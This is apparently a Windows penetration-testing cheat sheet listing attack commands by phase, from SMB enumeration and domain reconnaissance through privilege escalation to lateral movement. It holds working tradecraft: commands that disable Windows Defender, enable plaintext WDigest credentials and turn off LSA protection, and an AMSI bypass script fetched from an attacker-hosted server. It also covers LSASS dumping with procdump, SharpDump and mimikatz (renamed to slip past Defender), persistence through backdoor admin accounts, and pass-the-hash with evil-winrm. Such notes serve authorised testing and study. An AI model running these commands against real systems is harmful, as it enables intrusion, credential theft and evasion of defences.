Windows


# Anonymous users can obtain the Windows password policy

msf > use auxiliary/scanner/smb/smb_enumusers 
------------------------------------------------------------------------------------------------------------------------------------------------------

# CIFS NULL Session Permitted

enum4linux -a <target IP>

nbtscan <target IP>

rpcclient -U "" <target IP>
Enter  's password: <return>
rpcclient $> 
srvinfo
enumdomusers
queryuser <user>
netshareenum
netshareenumall
querydominfo
getdompwinfo

net use \\target IP\ipc$ "" /u:""
------------------------------------------------------------------------------------------------------------------------------------------------------

# CIFS Share Writable By Everyone

Places > Network > Browse Network
------------------------------------------------------------------------------------------------------------------------------------------------------

# NetBIOS and SMB

smbmap -H <target IP>                             Check for access to open shares

enum -G <target IP>
enum -P <target IP>

nbtenum -r <target IP>
nbtenum -q <target IP>

nbtscan -r <target range>
nbtscan -f hosts.txt
------------------------------------------------------------------------------------------------------------------------------------------------------

# OS Versions

Windows NT 4                                      4.0
Windows 2000                                      5.0
Windows XP                                        5.1
Windows Server 2003, 2003 R2                      5.2
Windows Vista, Server 2008                        6.0
Windows 7, Server 2008 R2                         6.1
Windows 8, Server 2012                            6.2
Windows 8.1, Server 2012 R2                       6.3
Windows 10, Server 2016, Server 2019              10.0

wmic os list brief                                Show info about the OS
PS C:\> Get-WmiObject -Class Win32_OperatingSystem | select SystemDirectory,BuildNumber,SerialNumber,Version | ft
------------------------------------------------------------------------------------------------------------------------------------------------------

# Services

PS C:\> Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl
------------------------------------------------------------------------------------------------------------------------------------------------------

# SMB Open File Shares

- Anonymous
smbclient -L <target IP>                          List shares
smbclient //<target IP>/<share>                   Connect to a share
smb: \> dir                                       List directory contents
smb: \> more file.txt                             Read a file
smb: \> get file.txt                              Download a file
smb: \> put file.txt                              Upload a file

- Using credentials
smbclient //<target IP>/<share> -U <user>
------------------------------------------------------------------------------------------------------------------------------------------------------

# User Accounts

- Local
net users                                         Local users
net user <current user>                           Info on a local user
net accounts                                      Local password policy
net config workstation
net localgroup                                    Local security groups
net localgroup Administrators                     Users in the local Administrators security group
net localgroup "Remote Desktop Users"             Users in the local Remote Desktop Users security group

net user <user> <password> /add                   Create a new local user
net localgroup HR /add                            Create a new local security group
net localgroup Administrators <user> /add         Add the new user to the local Administrators security group

net view                                          Domains, computers, or resources that are being shared by the specified computer
net view /domain                                  Computers in other domain

- Domain
net accounts /domain                              Domain password policy
net user /domain                                  Show domain users
net user <user> /domain                           Show info on a domain user
net group /domain
net group "domain admins" /domain                 Show domain admin
net group "domain users" /domain                  Show domain users
net group "domain controllers" /domain            Show domain controllers
nltest /domain_trusts                             Show domain trusts

net localgroup Administrators /domain             Users in the domain Administrators Security Group
net localgroup /domain                            Domain Security Groups

net user <user> <password> /add /domain           Add a user to the domain
net group "Domain Admins" <user> /add /domain     Add a user to a specific Security Group on the domain
------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------

# Situational awareness using a low level account

hostname
whoami
whoami /groups
whoami /priv
systeminfo                                        hostname, OS name and version, domain, and hot fixes
net share                                         Shared folders
net users                                         Local users
net localgroup administrators                     Local administrators

ipconfig /all
route print
arp -a
netstat -ano | findstr "LISTEN"
netstat -ano | findstr "ESTABLISH"

nltest /dclist:<domain>                           Show domain controllers
nltest /domain_trusts /all_trusts                 Show domain trusts

net group "domain admins" /domain
net group "enterprise admins" /domain
net group "Domain Computers" /domain

doskey /history                                   Show command history
gpresult /z

dir /s *password* == *cred* == *vnc*
findstr /si password *.ini *.pdf *.txt *.docx *.xlsx
reg query HKCU /f password /t REG_SZ /s
------------------------------------------------------------------------------------------------------------------------------------------------------

# Evasion

Disable Windows Defender Behavior Monitoring.
Set the Severe Threat default action to ‘Allow’.
Disable Realtime Monitoring.
Exclude the ‘C:\Windows’ path from scheduled and real-time scanning.

try {Set-MpPreference -DisableBehaviorMonitoring 1 -AsJob; Set-MpPreference -SevereThreatDefaultAction Allow -AsJob; Set-MpPreference -DisableRealtimeMonitoring 1 -AsJob; Add-MpPreference -ExclusionPath 'C:\Windows' -Force -AsJob} catch {}

- Allow RDP through the firewall
netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389

- Start Remote Desktop Services
net start TermService

- Enabled WDigest authentication, this enforces the storage of credentials in plaintext on future logins.
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

- Disable LSA protection
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f

- Bypass AMSI
Kali
cd /opt/Nishang/Bypass/
python3 -m http.server 80

Target
Open Command Prompt
powershell -nop -exe bypass
curl http://kali IP/Invoke-AmsiBypass.ps1 -o test.ps1
Import-Module .\test.ps1
Invoke-AmsiBypass -Verbose
------------------------------------------------------------------------------------------------------------------------------------------------------

# Persistence

- Create a new local user
net user <user> <password> /add
net localgroup Administrators <user> /add

- Autorun registry keys

- Scheduled task

------------------------------------------------------------------------------------------------------------------------------------------------------

# Privilege Escalation

Tools will need to be transferred to the target.

- C#
/opt/SharpCollection/
SharpUp.exe audit

- Executable
/opt/SharpCollection/
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe -group=remote
Watson.exe
winPEAS.exe cmd

- PowerShell
/usr/share/windows-resources/powersploit/Privesc/
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

/opt/PrivescCheck/
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

- Python
/opt/Windows-Exploit-Suggester-NG
./wes.py --update
systeminfo > systeminfo.txt
Transfer the file to Kali.
./wes.py systeminfo.txt
------------------------------------------------------------------------------------------------------------------------------------------------------

# Dump the LSASS (Local Security Authority Subsystem Service) process

This contains NTLM hashes of Windows credentials of users who have logged into the computer.
They can be brute forced offline for cleartext passwords or used in a pass-the-hash attack for lateral movement.
In order to dump LSASS, SEDebugPrivilege must be enabled: whoami /priv
Need to be running from an admin Command Prompt.

- Check if Credential Guard is configured and running
$DevGuard = Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
if ($DevGuard.SecurityServicesConfigured -contains 1) {"Credential Guard configured"}
if ($DevGuard.SecurityServicesRunning -contains 1) {"Credential Guard running"}

- GUI access
Open the Task Manager > Details > right click on lsass.exe > Create dump file

- ProcDump
curl https://live.sysinternals.com/tools/procdump.exe  -o procdump.exe
procdump.exe -accepteula -ma lsass.exe lsass.dmp

Some EDR solutions will alert or block this based on the “lsass” process name. This can usually be bypassed by specifying the LSASS process ID instead.
tasklist | findstr lsass
procdump.exe -accepteula -ma <PID> lsass.dmp

Transfer dump to Kali VM, then use pypykatz to extract the stored credentials and hashes.
pypykatz lsa dump lsass.dmp

- CME
crackmapexec smb <target IP> -u <admin user> -p <password> --lsa
Output stored in ~/.cme/logs/

-SharpDump
/opt/SharpCollection/NetFramework_4.7_x64/SharpDump.exe
Transfer file to target.
SharpDump.exe
Transfer dump to Windows VM.
Rename debug<PID>.bin to debug<PID>.gz
mimikatz.exe
sekurlsa::minidump C:\Users\joe\debug<PID>
sekurlsa::logonPasswords

- mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/
Transfer file to target.
Rename mimikatz.exe to DumbStack.log to bypass Windows Defender.
DumbStack.log
sekurlsa::minidump lsass.dmp
log lsass.txt
sekurlsa::logonPasswords
------------------------------------------------------------------------------------------------------------------------------------------------------

# Lateral Movement

- Windows Remote Management (WinRM)
nmap -Pn -n -T4 --open -p5985,5986 -sV <target IP>

msf > use auxiliary/scanner/winrm/winrm_auth_methods     Identify the WinRM authentication method

crackmapexec winrm <target IP> -u <user> -p <password> -x ipconfig

evil-winrm -i <target IP> -u <user> -p <password> -s /opt/Nishang/
menu
Gather/Invoke-Mimikatz.ps1
Invoke-Mimikatz
evil-winrm -i <target IP> -u <user> -H <hash>

